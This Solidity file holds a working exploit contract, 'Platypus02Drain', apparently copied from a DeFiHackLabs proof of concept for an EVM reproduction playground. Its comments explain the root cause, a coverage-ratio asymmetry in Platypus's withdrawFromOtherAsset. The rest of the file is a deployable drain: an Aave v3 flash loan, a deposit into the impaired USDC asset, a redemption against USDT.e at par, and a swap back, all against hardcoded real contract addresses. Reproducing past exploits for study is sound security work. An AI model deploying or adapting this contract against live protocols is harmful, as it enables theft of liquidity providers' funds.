// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Platypus02).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this), and the Aave v3 flash-loan callback
// `executeOperation` lives on the test itself, so there is no standalone
// attack contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit -> run, executeOperation) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Platypus02_exp.sol.
//
// Root cause: depositing into an UNDER-covered Platypus asset (coverage < 1)
// mints bonus "impairment gain" LP scaled by 1/eqCov (Pool._deposit,
// contracts_pool_Pool.sol L508-513). withdrawFromOtherAsset() then lets that
// bonus LP be redeemed against a DIFFERENT, OVER-covered asset at THAT
// asset's full par value -- the payout is computed from the wanted asset's
// own (healthy) coverage, not the initial (impaired) asset's, and only the
// initial asset's liability (a smaller number) is burned in return
// (contracts_pool_Pool.sol L715-732). The attacker buys a discounted claim
// in the impaired USDC asset and cashes it out at par against the
// over-covered USDT.e asset, pocketing the difference.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAaveFlashloanSimple {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IPlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);

    function withdrawFromOtherAsset(
        address initialToken,
        address wantedToken,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256);

    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256, uint256);
}

contract Platypus02Drain {
    IERC20 constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 constant USDTe = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 constant LP_USDC = IERC20(0x06f01502327De1c37076Bea4689a7e44279155e9);
    IPlatypusPool constant PlatypusPool = IPlatypusPool(0xbe52548488992Cc76fFA1B42f3A58F646864df45);
    IAaveFlashloanSimple constant aaveV3 = IAaveFlashloanSimple(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    // step 0: flash-borrow 85,000 USDC from Aave v3; the callback does the rest.
    function run() external {
        aaveV3.flashLoanSimple(address(this), address(USDC), 85_000 * 1e6, new bytes(0), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        USDC.approve(address(aaveV3), amount + premium);

        // step 1: deposit the flash-loaned USDC into the impaired USDC asset,
        // minting bonus impairment-gain LP_USDC (coverage 0.789 < 1 at fork block).
        USDC.approve(address(PlatypusPool), USDC.balanceOf(address(this)));
        PlatypusPool.deposit(address(USDC), USDC.balanceOf(address(this)), address(this), block.timestamp); // deposit USDC

        // step 2: redeem that LP against the over-covered USDT.e asset (coverage
        // 1.313) at USDT.e's own par value -- the decisive asymmetry.
        LP_USDC.approve(address(PlatypusPool), LP_USDC.balanceOf(address(this)));
        PlatypusPool.withdrawFromOtherAsset(
            address(USDC), address(USDTe), LP_USDC.balanceOf(address(this)), 0, address(this), block.timestamp
        ); // withdraw USDC-LP from USDT.e-LP , calculate the amount of USDT.e to withdraw base on USDT.e-LP ratio, which different from USDC-LP's ratio

        // step 3: monetize the over-covered USDT.e back into USDC.
        USDTe.approve(address(PlatypusPool), USDTe.balanceOf(address(this)));
        PlatypusPool.swap(
            address(USDTe), address(USDC), USDTe.balanceOf(address(this)), 0, address(this), block.timestamp
        ); // swap USDT.e to USDC

        return true;
    }
}
